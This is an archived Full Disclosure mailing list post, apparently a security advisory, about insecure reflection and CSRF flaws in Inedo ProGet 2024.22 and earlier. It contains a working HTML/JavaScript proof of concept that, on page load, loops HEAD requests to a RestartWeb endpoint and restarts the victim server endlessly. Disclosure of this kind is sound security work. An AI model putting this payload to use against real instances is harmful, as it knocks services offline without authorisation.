---
title: Inedo ProGet Insecure Reflection and CSRF Vulnerabilities
url: https://seclists.org/fulldisclosure/2025/Apr/30
source: Full Disclosure
date: 2025-04-28
fetch_date: 2025-10-06T22:05:26.509647
---

# Inedo ProGet Insecure Reflection and CSRF Vulnerabilities

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](29)
[By Date](date.html#30)
[![Next](/images/right-icon-16x16.png)](31)

[![Previous](/images/left-icon-16x16.png)](29)
[By Thread](index.html#30)
[![Next](/images/right-icon-16x16.png)](31)

![](/shared/images/nst-icons.svg#search)

# Inedo ProGet Insecure Reflection and CSRF Vulnerabilities

---

*From*: Daniel Owens via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Sat, 26 Apr 2025 07:12:32 +0000

---

```
Inedo ProGet 2024.22 and below are vulnerable to unauthenticated denial of service and information disclosure attacks
(among other things) because the information system directly exposes the C# reflection used during the request-action
mapping process and fails to properly protect certain pathways.  These are amplified by cross-site request forgery
vulnerabilities (CSRF) due to the application's failure to verify the HTTP request method and apply CSRF protections
accordingly.  Specifically, unauthenticated attackers can chain CSRF and reflection attacks to cancel executions,
restart the ProGet instance, and perform certain other actions.  The following is a sample script that can be used to
demonstrate the vulnerability, restarting the victim Inedo ProGet instance ad infinitum.  Notably, this attack will
work regardless of browser pre-flight protections, etc., since ProGet ignores the HTTP request method.  It is likely
that more recent versions are also vulnerable to this, but the CSRF portion allows attacking internal (private)
instances in addition to directly accessible (e.g., public) instances.  This is vulnerability is known to exist across
multiple major versions.

<!DOCTYPE html>
<html lang="en">
<head>
<script>
function sleep(ms) {
                return new Promise(resolve => setTimeout(resolve, ms));
}
function sendData() {
                var xhr = new XMLHttpRequest();
                xhr.open('HEAD',
'http://vict.im/0x44/ProGet.WebApplication/Inedo.ProGet.WebApplication.Pages.Errors.UserNotFoundErrorPage/RestartWeb';);
                xhr.send();
}
async function executeDosAttack() {
                while(true) {
                                try {
                                                sendData();
                                                sendData();
                                                // Sleep for 500 ms
                                                await sleep(500);
                                } catch(ignoreMe) {
                                                // Gobble up exceptions since we expect the service to go down and
pre-flight triggers the shutdown anyway
                                }
                }
}
</script>
</head>
<body onload="executeDosAttack()">
<h1>Insecure Reflection + CSRF + DOS Attack</h1>
<p>It's silently working in the background...</p>
</body>
</html>

_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](29)
[By Date](date.html#30)
[![Next](/images/right-icon-16x16.png)](31)

[![Previous](/images/left-icon-16x16.png)](29)
[By Thread](index.html#30)
[![Next](/images/right-icon-16x16.png)](31)

### Current thread:

* **Inedo ProGet Insecure Reflection and CSRF Vulnerabilities** *Daniel Owens via Fulldisclosure (Apr 26)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")